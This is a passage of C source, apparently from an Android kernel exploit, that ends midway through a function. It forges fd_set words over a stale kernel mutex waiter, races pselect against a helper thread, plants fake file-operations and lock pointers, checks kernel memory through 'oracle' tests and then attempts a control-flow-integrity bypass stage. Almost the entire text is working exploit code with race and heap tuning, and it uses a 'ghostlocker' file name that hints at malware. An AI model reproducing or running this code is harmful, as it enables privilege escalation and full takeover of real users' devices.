                          PSELECT_TCP_OOB_LEAF_DIAG
                              ? 0
                              : fake_fops - FOPS_TABLE_OFF + RIGHT_OFF
#endif
#else
                          0
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 2, 0);
  pselect_put_global_word(in, out, ex, shift + 3,
#if defined(PSELECT_FOPS_PI_TREE_WRITE) && PSELECT_FOPS_PI_TREE_WRITE
                          fake_fops
#else
                          PSELECT_FAKE_WAITER_PI_PARENT_COLOR
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 4,
#if defined(PSELECT_FOPS_PI_TREE_WRITE) && PSELECT_FOPS_PI_TREE_WRITE
                          data_addr(ASHMEM_MISC_FOPS)
#else
                          0
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 5, 0);
  pselect_put_global_word(in, out, ex, shift + 6,
                          runtime_waiter_task ? runtime_waiter_task : text_addr(INIT_TASK));
#if defined(PSELECT_NULL_LOCK_DIAG) && PSELECT_NULL_LOCK_DIAG
  pselect_put_global_word(in, out, ex, shift + 7, 0);
#else
  pselect_put_global_word(in, out, ex, shift + 7, fake_lock);
#endif
  pselect_put_global_word(in, out, ex, shift + 8,
#ifdef PSELECT_FAKE_WAITER_PRIO
                          PSELECT_FAKE_WAITER_PRIO
#else
                          FAKE_WAITER_PRIO
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 9, 0);
#else
  fdset_put_word(in, word_shift + 0, fake_w0);
  fdset_put_word(in, word_shift + 1, 0);
  fdset_put_word(in, word_shift + 2, 0);
  fdset_put_word(in, word_shift + 3, 0);
  fdset_put_word(ex, word_shift + 0, text_addr(INIT_TASK));
  fdset_put_word(ex, word_shift + 1, fake_lock);
  fdset_put_word(ex, word_shift + 2, 3);
  fdset_put_word(ex, word_shift + 3, 0);
#endif
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  int route_attempt_limit = route_attempt_limit_runtime();
  for (int route_attempt = 1; route_attempt <= route_attempt_limit;
       route_attempt++) {
    int refresh_page = route_attempt != 1;
#if PSELECT_REFRESH_PAGE_EACH_ROUTE
    refresh_page = route_attempt != 1;
#elif defined(LEGACY_REUSE_FOPS_PAGE_FOR_ROUTE) && \
    LEGACY_REUSE_FOPS_PAGE_FOR_ROUTE
    refresh_page = 0;
#endif
    if (refresh_page) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }
#if defined(PSELECT_PREOPEN_ASHMEM) && PSELECT_PREOPEN_ASHMEM
    if (cfi_preopen_fd >= 0) {
      close(cfi_preopen_fd);
      cfi_preopen_fd = -1;
    }
    cfi_preopen_fd = open_ashmem_device();
    if (cfi_preopen_fd < 0) {
      pr_warning("pselect preopen ashmem failed errno=%d\n", errno);
    }
#endif

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }
#if defined(PSELECT_PIPE_WAKE) && PSELECT_PIPE_WAKE
    int block_in_pipe[2];
    SYSCHK(pipe(block_in_pipe));
    int block_in_writer_hold = -1;
    int pipe_write_flags = fcntl(pipefd[1], F_GETFL, 0);
    SYSCHK(fcntl(pipefd[1], F_SETFL, pipe_write_flags | O_NONBLOCK));
    unsigned char pipe_fill[4096];
    memset(pipe_fill, 0x5a, sizeof(pipe_fill));
    while (write(pipefd[1], pipe_fill, sizeof(pipe_fill)) > 0) {}
#elif PSELECT_BLOCK_READ_FDSET
    int block_in_pipe[2];
    SYSCHK(pipe(block_in_pipe));
    int block_in_writer_hold = -1;
#else
    int runtime_block_read_fdset = pselect_block_read_fdset_enabled();
    int block_in_pipe[2] = {-1, -1};
    int block_in_writer_hold = -1;
    if (runtime_block_read_fdset) {
      SYSCHK(pipe(block_in_pipe));
    }
#endif
#if PSELECT_BLOCK_WRITE_FDSET || PSELECT_BLOCK_WRITE_WORD2
    int block_out_pipe[2];
    SYSCHK(pipe(block_out_pipe));
    int block_out_read_hold = -1;
    int block_out_flags = fcntl(block_out_pipe[1], F_GETFL, 0);
    SYSCHK(fcntl(block_out_pipe[1], F_SETFL,
                 block_out_flags | O_NONBLOCK));
    unsigned char block_out_fill[4096];
    memset(block_out_fill, 0xa5, sizeof(block_out_fill));
    while (write(block_out_pipe[1], block_out_fill,
                 sizeof(block_out_fill)) > 0) {}
#endif
    int ready_fd = -1;
    int ready_peer = -1;
    if (!make_ready_tcp_fd(&ready_fd, &ready_peer)) {
      cfi_last_step = 35;
      cfi_last_errno = errno;
      pr_error("pselect ready TCP setup errno=%d\n", errno);
      close(high_read);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set local_in;
    fd_set local_out;
    fd_set local_ex;
    fd_set *in = &local_in;
    fd_set *out = &local_out;
    fd_set *ex = &local_ex;
    void *copyout_mapping = MAP_FAILED;
    int copyout_fd = -1;
    const size_t copyout_mapping_size =
        (PSELECT_EX_CROSS_PAGE_FAULT ? 4 : 3) * PAGE_SIZE;
#if defined(PSELECT_COPYOUT_FAULT_STRETCH) && PSELECT_COPYOUT_FAULT_STRETCH
    char copyout_path[128];
    snprintf(copyout_path, sizeof(copyout_path),
             "/data/local/tmp/.ghostlocker-fdsets-%d-%d",
             getpid(), route_attempt);
    copyout_fd = open(copyout_path, O_CREAT | O_TRUNC | O_RDWR | O_CLOEXEC,
                      0600);
    if (copyout_fd >= 0) {
      unlink(copyout_path);
    }
    if (copyout_fd < 0 || ftruncate(copyout_fd, copyout_mapping_size) != 0) {
      pr_error("pselect copyout backing file errno=%d\n", errno);
      if (copyout_fd >= 0) close(copyout_fd);
      close(high_read);
      close(ready_fd);
      close(ready_peer);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }
    copyout_mapping = mmap(NULL, copyout_mapping_size, PROT_READ | PROT_WRITE,
                           MAP_SHARED, copyout_fd, 0);
    if (copyout_mapping == MAP_FAILED) {
      pr_error("pselect copyout mapping errno=%d\n", errno);
      close(high_read);
      close(ready_fd);
      close(ready_peer);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }
    /* The forged fd_sets can select the low-numbered backing fd.  Preserve
     * it above nfds before open_selected_fds() starts replacing descriptors;
     * otherwise posix_fadvise() silently runs on a pipe/socket and no
     * filemap fault window is created. */
    int high_copyout_fd =
        fcntl(copyout_fd, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 37);
    if (high_copyout_fd < 0) {
      pr_error("pselect F_DUPFD copyout errno=%d\n", errno);
      munmap(copyout_mapping, copyout_mapping_size);
      close(copyout_fd);
      close(high_read);
      close(ready_fd);
      close(ready_peer);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }
    close(copyout_fd);
    copyout_fd = high_copyout_fd;
    in = (fd_set *)copyout_mapping;
    out = (fd_set *)((unsigned char *)copyout_mapping + PAGE_SIZE);
    ex = (fd_set *)((unsigned char *)copyout_mapping + 2 * PAGE_SIZE);
#if PSELECT_EX_CROSS_PAGE_FAULT
    /* Diagnostic retained disabled: with nfds=320, set_fd_set() copies 40
     * bytes forward.  This layout commits user ex.word0/1 before faulting on
     * word2, but device traces proved that it does not thereby populate the
     * dangling waiter's kernel-stack lock field. */
    ex = (fd_set *)((unsigned char *)copyout_mapping + 3 * PAGE_SIZE - 16);
#endif
#endif
#if defined(PSELECT_PIPE_WAKE) && PSELECT_PIPE_WAKE
    /*
     * The forged read fd_set can select the low-numbered write end of this
     * pipe.  Preserve a writer above nfds before dup2() replaces selected
     * descriptors, otherwise every duplicated read end observes EOF and
     * pselect returns before the consumer runs.
     */
    block_in_writer_hold =
        fcntl(block_in_pipe[1], F_DUPFD, PSELECT_ROUTE_NFDS + 34);
    SYSCHK(block_in_writer_hold);
#elif PSELECT_BLOCK_READ_FDSET
    /*
     * Keep every forged read-fd valid but not readable.  OOB readiness still
     * wakes exceptfds, while readfds no longer overwrite waiter qwords.
     */
    block_in_writer_hold =
        fcntl(block_in_pipe[1], F_DUPFD, PSELECT_ROUTE_NFDS + 34);
    SYSCHK(block_in_writer_hold);
#else
    if (runtime_block_read_fdset) {
      /*
       * Runtime version of PSELECT_BLOCK_READ_FDSET.  This is useful on M53
       * because the stale hit depends on heap geometry while read readiness
       * can overwrite waiter word 0 with a small readiness mask.
       */
      block_in_writer_hold =
          fcntl(block_in_pipe[1], F_DUPFD, PSELECT_ROUTE_NFDS + 34);
      SYSCHK(block_in_writer_hold);
    }
#endif
#if PSELECT_BLOCK_WRITE_FDSET || PSELECT_BLOCK_WRITE_WORD2
    block_out_read_hold =
        fcntl(block_out_pipe[0], F_DUPFD, PSELECT_ROUTE_NFDS + 35);
    SYSCHK(block_out_read_hold);
#endif
    int route_word_shift = route_word_shift_runtime(route_attempt);
#if defined(PSELECT_SLIDE_SWEEP) && PSELECT_SLIDE_SWEEP
    if (!getenv("PSELECT_WORD_SHIFT_RUNTIME")) {
      int sweep_shift = route_attempt - 1;
      if (sweep_shift > 5) {
        sweep_shift = 5;
      }
      route_word_shift = sweep_shift;
      pr_info("pselect slide sweep attempt=%d shift=%d\n",
              route_attempt, route_word_shift);
    }
    prepare_pselect_fdsets_shift(in, out, ex, route_word_shift);
#else
    if (route_word_shift == SLIDE_PSELECT_WORD_SHIFT) {
      prepare_pselect_fdsets(in, out, ex);
    } else {
      pr_info("pselect runtime word shift=%d default=%d\n",
              route_word_shift, SLIDE_PSELECT_WORD_SHIFT);
      prepare_pselect_fdsets_shift(in, out, ex, route_word_shift);
    }
#endif
#if PSELECT_INERT_EXCEPT_FDSET
    /*
     * Keep forged exceptfds inert and reserve one word outside the ten-qword
     * waiter for the OOB wake.  With shift 4, ex word 4 is global word 14;
     * changing it cannot alter the reclaimed waiter at global words 4..13.
     */
    FD_SET(PSELECT_DIAG_WAKE_FD, ex);
#endif
#if defined(PSELECT_REMAP_WRITE_FDS) && PSELECT_REMAP_WRITE_FDS
    pselect_read_shape = *in;
    pselect_write_shape = *out;
    pselect_except_shape = *ex;
#endif
#if PSELECT_TCP_TRANSITION_ALL
    /* All selected descriptors share one accepted TCP endpoint.  Its send
     * queue is filled below, so it starts unreadable/unwritable/non-OOB.  The
     * peer later drains + sends normal data + sends OOB, making all three
     * forged result sets ready in one transition. */
#if PSELECT_BLOCK_WRITE_FDSET
    open_selected_fds(in, out, ex, ready_fd, block_out_pipe[1], ready_fd);
#else
    open_selected_fds(in, out, ex, ready_fd, ready_fd, ready_fd);
#endif
#elif defined(PSELECT_PIPE_WAKE) && PSELECT_PIPE_WAKE
    open_selected_fds(in, out, ex, block_in_pipe[0], pipefd[1], ready_fd);
#elif PSELECT_BLOCK_READ_FDSET
#if PSELECT_BLOCK_WRITE_FDSET
    open_selected_fds(in, out, ex, block_in_pipe[0], block_out_pipe[1],
                      ready_fd);
#elif PSELECT_BLOCK_WRITE_WORD2
    open_selected_fds_ex(in, out, ex, block_in_pipe[0], ready_fd, ready_fd,
                         2, block_out_pipe[1]);
#else
    open_selected_fds(in, out, ex, block_in_pipe[0], ready_fd, ready_fd);
#endif
#else
#if PSELECT_BLOCK_WRITE_FDSET
    if (runtime_block_read_fdset) {
#if PSELECT_INERT_EXCEPT_FDSET
      open_selected_fds(in, out, ex, block_in_pipe[0], block_out_pipe[1],
                        block_out_pipe[1]);
#else
      open_selected_fds(in, out, ex, block_in_pipe[0], block_out_pipe[1],
                        ready_fd);
#endif
    } else {
#if PSELECT_INERT_EXCEPT_FDSET
      open_selected_fds(in, out, ex, block_out_pipe[1], block_out_pipe[1],
                        block_out_pipe[1]);
#else
      open_selected_fds(in, out, ex, ready_fd, block_out_pipe[1], ready_fd);
#endif
    }
#if PSELECT_INERT_EXCEPT_FDSET
    /* The dedicated fd is both read- and except-selected, and stays idle
     * until the consumer sends MSG_OOB through ready_peer. */
    SYSCHK(dup2(ready_fd, PSELECT_DIAG_WAKE_FD));
#endif
#elif PSELECT_BLOCK_WRITE_WORD2
    if (runtime_block_read_fdset) {
      open_selected_fds_ex(in, out, ex, block_in_pipe[0], ready_fd, ready_fd,
                           2, block_out_pipe[1]);
    } else {
      open_selected_fds_ex(in, out, ex, ready_fd, ready_fd, ready_fd,
                           2, block_out_pipe[1]);
    }
#else
    if (runtime_block_read_fdset) {
      open_selected_fds(in, out, ex, block_in_pipe[0], ready_fd, ready_fd);
    } else {
      open_selected_fds(in, out, ex, ready_fd, ready_fd, ready_fd);
    }
#endif
#endif
    fd_set expected_in = *in;
    fd_set expected_out = *out;
    fd_set expected_ex = *ex;
#if defined(PSELECT_COPYOUT_FAULT_STRETCH) && PSELECT_COPYOUT_FAULT_STRETCH
    if (msync(copyout_mapping, copyout_mapping_size, MS_SYNC) != 0) {
      pr_warning("pselect copyout backing sync errno=%d\n", errno);
    }
#endif

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&consumer_inflight, 0);
#if defined(PSELECT_PIPE_WAKE) && PSELECT_PIPE_WAKE
    atomic_store(&pselect_ready_peer_fd, high_read);
#else
    atomic_store(&pselect_ready_peer_fd, ready_peer);
#endif
    atomic_store(&pselect_ready_target_fd, ready_fd);
#if PSELECT_BLOCK_WRITE_FDSET
    atomic_store(&pselect_write_drain_fd, block_out_read_hold);
#else
    atomic_store(&pselect_write_drain_fd, -1);
#endif
    atomic_store(&pselect_returned, 0);
    atomic_store(&pselect_output_valid, 0);
#if defined(PSELECT_COPYOUT_FAULT_STRETCH) && PSELECT_COPYOUT_FAULT_STRETCH
    atomic_store(&pselect_copyout_fault_base,
                 (uintptr_t)copyout_mapping);
    atomic_store(&pselect_copyout_fault_fd, copyout_fd);
#endif
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    errno = 0;
    /* SH53D: force pselect to BLOCK (not instant-return) so the consumer
     * window exists. Drain readable fds, fill writable pipe (64KB) so
     * nothing is ready at entry; consumer OOB (except fd) wakes it later.
     * Without this, ~80 pre-ready fds return instantly and the race window
     * never opens (consumer descheduled under load misses usec window). */
    {
      char drainbuf[4096];
      for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
        if (FD_ISSET(fd, in)) {
          int fl = fcntl(fd, F_GETFL);
          if (fl >= 0) {
            fcntl(fd, F_SETFL, fl | O_NONBLOCK);
            while (read(fd, drainbuf, sizeof(drainbuf)) > 0) {
            }
            fcntl(fd, F_SETFL, fl);
          }
          break;
        }
      }
      for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
        if (FD_ISSET(fd, out)) {
          int fl = fcntl(fd, F_GETFL);
          if (fl >= 0) {
            fcntl(fd, F_SETFL, fl | O_NONBLOCK);
            char fillbuf[65536];
            memset(fillbuf, 0x5a, sizeof(fillbuf));
            while (write(fd, fillbuf, sizeof(fillbuf)) > 0) {
            }
            fcntl(fd, F_SETFL, fl);
          }
          break;
        }
      }
#if PSELECT_TCP_TRANSITION_ALL
      /* A single nonblocking fill can stop at a transient send-queue limit
       * before loopback has filled the peer receive window.  Keep topping up
       * until no byte has been accepted for 20ms, making POLLOUT stably false
       * when pselect enters. */
      int ready_flags = fcntl(ready_fd, F_GETFL, 0);
      SYSCHK(ready_flags);
      SYSCHK(fcntl(ready_fd, F_SETFL, ready_flags | O_NONBLOCK));
      unsigned char tcp_fill[4096];
      memset(tcp_fill, 0x6b, sizeof(tcp_fill));
      size_t fill_started = gettime_ns();
      size_t last_progress = fill_started;
      size_t fill_bytes = 0;
      while (gettime_ns() - fill_started < 200000000ULL &&
             gettime_ns() - last_progress < 20000000ULL) {
        ssize_t n = write(ready_fd, tcp_fill, sizeof(tcp_fill));
        if (n > 0) {
          fill_bytes += (size_t)n;
          last_progress = gettime_ns();
        } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
          usleep(100);
        } else {
          break;
        }
      }
      SYSCHK(fcntl(ready_fd, F_SETFL, ready_flags));
      pr_info("pselect TCP transition saturated bytes=%zu quiet_ns=%zu\n",
              fill_bytes, gettime_ns() - last_progress);
#endif
    }
    atomic_store(&punch_consume_go, route_attempt);
    fd_set *sys_out = PSELECT_NULL_WRITE_FDSET ? NULL : out;
    int ret = pselect(PSELECT_ROUTE_NFDS, in, sys_out, ex, timeoutp, NULL);
    int saved_errno = errno;
    int output_valid =
        ret >= 0 && memcmp(in, &expected_in, sizeof(*in)) == 0 &&
        memcmp(out, &expected_out, sizeof(*out)) == 0 &&
        memcmp(ex, &expected_ex, sizeof(*ex)) == 0;
    atomic_store(&pselect_output_valid, output_valid);
    atomic_store(&pselect_returned, 1);
    atomic_store(&punch_consume_go, 0);
    while (atomic_load(&consumer_inflight) != 0) {
      __asm__ volatile("yield" ::: "memory");
    }
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
            "valid=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, output_valid,
            delay_usec);
    unsigned long waiter_w0 =
        pselect_get_global_word(in, out, ex, route_word_shift + 0);
    unsigned long waiter_parent =
        pselect_get_global_word(in, out, ex, route_word_shift + 3);
    unsigned long waiter_task =
        pselect_get_global_word(in, out, ex, route_word_shift + 6);

    unsigned long waiter_lock =
        pselect_get_global_word(in, out, ex, route_word_shift + 7);
    unsigned long waiter_prio =
        pselect_get_global_word(in, out, ex, route_word_shift + 8);
    unsigned long legacy_ex_word2 = ((unsigned long *)ex)[2];
    unsigned long expected_parent =
        pselect_get_global_word(&expected_in, &expected_out, &expected_ex,
                                route_word_shift + 3);
    unsigned long expected_task =
        pselect_get_global_word(&expected_in, &expected_out, &expected_ex,
                                route_word_shift + 6);
    int stale_waiter_oracle =
        waiter_prio == PSELECT_STALE_WAITER_PRIO_ORACLE;
    pr_info("DIAG waiter w0=%016zx parent=%016zx task=%016zx lock=%016zx prio=%016zx fake_w0=%016zx fake_lock=%016zx\n",
            waiter_w0, waiter_parent, waiter_task, waiter_lock, waiter_prio,
            fake_w0, fake_lock);
    int structural_oracle =
        !output_valid && waiter_w0 == fake_w0 && waiter_lock == fake_lock;
    int legacy_ex_word2_oracle =
        accept_legacy_ex_word2_oracle() && structural_oracle &&
        legacy_ex_word2 == PSELECT_STALE_WAITER_PRIO_ORACLE;
    int clean_write_oracle =
        stale_waiter_oracle && structural_oracle &&
        waiter_parent == expected_parent;
    int partial_stale_lock_oracle =
        getenv("PSELECT_ACCEPT_PARTIAL_STALE_LOCK_ORACLE") &&
        stale_waiter_oracle && waiter_lock == fake_lock &&
        waiter_parent == expected_parent;
    int unsafe_partial_oracle =
        stale_waiter_oracle && !structural_oracle &&
        (waiter_w0 != fake_w0 || waiter_lock != fake_lock);
    int parent_color_dirty_oracle =
        stale_waiter_oracle && structural_oracle &&
        PSELECT_ACCEPT_PARENT_COLOR_DIRTY &&
        expected_parent == 0 && waiter_parent == 1;
    /* SH-53D's successful copyout replaces waiter w0/prio with readiness
     * bitmaps.  Keep this route opt-in and require all surviving forged
     * pointer fields to match before allowing the CFI probe. */
    int copyout_clobbered_oracle =
        getenv("PSELECT_ACCEPT_COPYOUT_CLOBBERED_CFI") &&
        route_word_shift == 4 &&
        waiter_parent == expected_parent && waiter_task == expected_task &&
        waiter_lock == fake_lock;
    int abort_unsafe_partial = 0;
    if (clean_write_oracle) {
      pr_info("pselect composite oracle hit shift=%d waiter.w0=%016lx "
              "waiter.lock=%016lx waiter.parent=%016lx waiter.prio=0x%lx\n",
              route_word_shift, waiter_w0, waiter_lock, waiter_parent,
              waiter_prio);
    } else if (parent_color_dirty_oracle) {
      pr_info("pselect composite oracle parent-color-dirty accepted shift=%d "
              "waiter.w0=%016lx waiter.lock=%016lx waiter.parent=%016lx/%016lx "
              "waiter.prio=0x%lx\n",
              route_word_shift, waiter_w0, waiter_lock, waiter_parent,
              expected_parent, waiter_prio);
      pselect_log_waiter_words(
          in, out, ex, &expected_in, &expected_out, &expected_ex,
          route_word_shift);
    } else if (stale_waiter_oracle && structural_oracle) {
      pr_info("pselect composite oracle partial shift=%d waiter.w0=%016lx "
              "waiter.lock=%016lx waiter.parent=%016lx/%016lx "
              "waiter.prio=0x%lx\n",
              route_word_shift, waiter_w0, waiter_lock, waiter_parent,
              expected_parent, waiter_prio);
      pselect_log_waiter_words(
          in, out, ex, &expected_in, &expected_out, &expected_ex,
          route_word_shift);
    } else if (partial_stale_lock_oracle) {
      pr_info("pselect partial stale-lock oracle accepted shift=%d "
              "waiter.w0=%016lx waiter.lock=%016lx waiter.parent=%016lx "
              "waiter.prio=0x%lx\n",
              route_word_shift, waiter_w0, waiter_lock, waiter_parent,
              waiter_prio);
    } else if (stale_waiter_oracle) {
      pr_info("pselect stale waiter oracle partial shift=%d waiter.w0=%016lx "
              "want=%016zx waiter.lock=%016lx want=%016zx "
              "waiter.parent=%016lx/%016lx waiter.prio=0x%lx valid=%d\n",
              route_word_shift, waiter_w0, fake_w0, waiter_lock, fake_lock,
              waiter_parent, expected_parent, waiter_prio, output_valid);
      if (unsafe_partial_oracle &&
          env_flag_or_default("PSELECT_ABORT_ON_UNSAFE_PARTIAL",
                              PSELECT_ABORT_ON_UNSAFE_PARTIAL)) {
        abort_unsafe_partial = 1;
        cfi_last_step = 37;
        cfi_last_errno = 0;
        pr_warning("pselect unsafe partial; aborting route before CFI/retry "
                   "shift=%d waiter.w0=%016lx/%016zx "
                   "waiter.lock=%016lx/%016zx\n",
                   route_word_shift, waiter_w0, fake_w0, waiter_lock,
                   fake_lock);
      }
    } else if (legacy_ex_word2_oracle) {
      pr_info("pselect legacy ex.word2 oracle accepted shift=%d "
              "ex.word2=0x%lx valid=%d waiter.prio=0x%lx\n",
              route_word_shift, legacy_ex_word2, output_valid, waiter_prio);
    } else if (copyout_clobbered_oracle) {
      pr_info("pselect copyout-clobbered oracle accepted shift=%d "
              "waiter.w0=%016lx waiter.task=%016lx waiter.lock=%016lx "
              "waiter.prio=0x%lx valid=%d\n",
              route_word_shift, waiter_w0, waiter_task, waiter_lock,
              waiter_prio, output_valid);
      pselect_observed_task = waiter_task;
    } else {
      pr_info("pselect stale waiter oracle miss shift=%d waiter.prio=0x%lx "
              "want=0x%lx ex.word2=0x%lx\n",
              route_word_shift, waiter_prio,
              (unsigned long)PSELECT_STALE_WAITER_PRIO_ORACLE,
              legacy_ex_word2);
    }
    if (stale_waiter_oracle) {
      pr_info("pselect waiter task word=%016lx expected=%016lx direct=%d\n",
              waiter_task,
              pselect_get_global_word(&expected_in, &expected_out,
                                      &expected_ex, route_word_shift + 6),
              is_direct_ptr(waiter_task));
      if (is_direct_ptr(waiter_task)) {
        pselect_observed_task = waiter_task;
        pr_info("pselect observed waiter task=%016lx\n", waiter_task);
      }
    }
    if (stale_waiter_oracle) {
      pselect_log_waiter_words(
          in, out, ex, &expected_in, &expected_out, &expected_ex,
          route_word_shift);
    }
    if (!output_valid) {
      for (int word = 0; word < 5; word++) {
        pr_info("pselect word=%d in=%016lx/%016lx out=%016lx/%016lx "
                "ex=%016lx/%016lx\n",
                word,
                ((unsigned long *)in)[word],
                ((unsigned long *)&expected_in)[word],
                ((unsigned long *)out)[word],
                ((unsigned long *)&expected_out)[word],
                ((unsigned long *)ex)[word],
                ((unsigned long *)&expected_ex)[word]);
      }
    }

    int allow_partial_cfi =
        getenv("PSELECT_ALLOW_PARTIAL_STALE_LOCK_CFI") != NULL;
    if (partial_stale_lock_oracle && !allow_partial_cfi) {
      pr_warning("pselect partial stale-lock oracle not promoted to CFI "
                 "without PSELECT_ALLOW_PARTIAL_STALE_LOCK_CFI\n");
    }
    int route_signal =
        calls > 0 && success > 0 &&
        (clean_write_oracle || parent_color_dirty_oracle ||
         (partial_stale_lock_oracle && allow_partial_cfi) ||
         legacy_ex_word2_oracle || copyout_clobbered_oracle);
#if defined(FOPS_RECLAIM_MUTATION_DIAG) && FOPS_RECLAIM_MUTATION_DIAG && \
    defined(PSELECT_STALE_TREE_REPLACEMENT_DIAG) && \
    PSELECT_STALE_TREE_REPLACEMENT_DIAG
    if (!route_signal && route_attempt == 1) {
      pr_info("pselect replacement diagnostic scanning after oracle miss\n");
      diagnose_reclaim_payload_mutations();
      diagnose_ion_payload_mutations();
      cfi_last_step = 34;
      cfi_last_errno = 0;
      break;
    }
#endif
    if (abort_unsafe_partial) {
      /* Cleanup below before leaving this route. */
    } else if (route_signal) {
#if defined(FOPS_RECLAIM_MUTATION_DIAG) && FOPS_RECLAIM_MUTATION_DIAG
      diagnose_reclaim_payload_mutations();
      diagnose_ion_payload_mutations();
#if defined(FOPS_RECLAIM_MUTATION_DIAG_CONTINUE_CFI) && \
    FOPS_RECLAIM_MUTATION_DIAG_CONTINUE_CFI
      if (env_flag_enabled("PSELECT_SKIP_CFI_AFTER_ORACLE")) {
        pr_info("pselect oracle hit cfi skipped by env\n");
        cfi_last_step = 36;
        route_verified = 1;
        maybe_exit_after_oracle_skip();
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
#else
      cfi_last_step = 34;
      cfi_last_errno = 0;
      break;
#endif
#else
      if (env_flag_enabled("PSELECT_SKIP_CFI_AFTER_ORACLE")) {
        pr_info("pselect oracle hit cfi skipped by env\n");
        cfi_last_step = 36;
        route_verified = 1;
        maybe_exit_after_oracle_skip();
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
#endif
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(ready_fd);
    close(ready_peer);
    close(pipefd[0]);
    close(pipefd[1]);
#if defined(PSELECT_PIPE_WAKE) && PSELECT_PIPE_WAKE
    close(block_in_writer_hold);
    close(block_in_pipe[0]);
    close(block_in_pipe[1]);
#elif PSELECT_BLOCK_READ_FDSET
    close(block_in_writer_hold);
    close(block_in_pipe[0]);
    close(block_in_pipe[1]);
#else
    if (runtime_block_read_fdset) {
      if (block_in_writer_hold >= 0) close(block_in_writer_hold);
      if (block_in_pipe[0] >= 0) close(block_in_pipe[0]);
      if (block_in_pipe[1] >= 0) close(block_in_pipe[1]);
    }
#endif
#if PSELECT_BLOCK_WRITE_FDSET || PSELECT_BLOCK_WRITE_WORD2
    close(block_out_read_hold);
    close(block_out_pipe[0]);
    close(block_out_pipe[1]);
#endif
    atomic_store(&pselect_copyout_fault_base, 0);
    atomic_store(&pselect_copyout_fault_fd, -1);
    if (copyout_mapping != MAP_FAILED) {
      munmap(copyout_mapping, copyout_mapping_size);
    }
    if (copyout_fd >= 0) {
      close(copyout_fd);
    }

    if (abort_unsafe_partial) {
      if (env_flag_or_default("PSELECT_EXIT_ON_UNSAFE_PARTIAL",
                              PSELECT_EXIT_ON_UNSAFE_PARTIAL)) {
        pr_warning("pselect unsafe partial exit requested\n");
        fflush(NULL);
        _exit(86);
      }
      break;
    }
    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, route_attempt_limit, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

#if defined(LEGACY_USE_TCP_ROUTE) && LEGACY_USE_TCP_ROUTE
#ifndef TCP_ZEROCOPY_RECEIVE
#define TCP_ZEROCOPY_RECEIVE 35
#endif
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)

struct tcp_punch_state {
  int fd;
  size_t page_size;
  atomic_int stop;
  atomic_int phase;
};

static int make_tcp_route_pair(int *client_fd, int *server_fd) {
  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) return 0;
  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  struct sockaddr_in addr = {
    .sin_family = AF_INET,
    .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    .sin_port = 0,
  };
  socklen_t addr_len = sizeof(addr);
  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0 ||
      getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    close(listener);
    return 0;
  }
  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (*client_fd < 0 ||
      connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    if (*client_fd >= 0) close(*client_fd);
    close(listener);
    return 0;
  }
  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  close(listener);
  if (*server_fd < 0) {
    close(*client_fd);
    return 0;
  }
  return 1;
}

static void *tcp_route_punch_thread(void *arg) {
  struct tcp_punch_state *state = arg;
  disable_rseq_for_thread();
  while (!atomic_load(&state->stop)) {
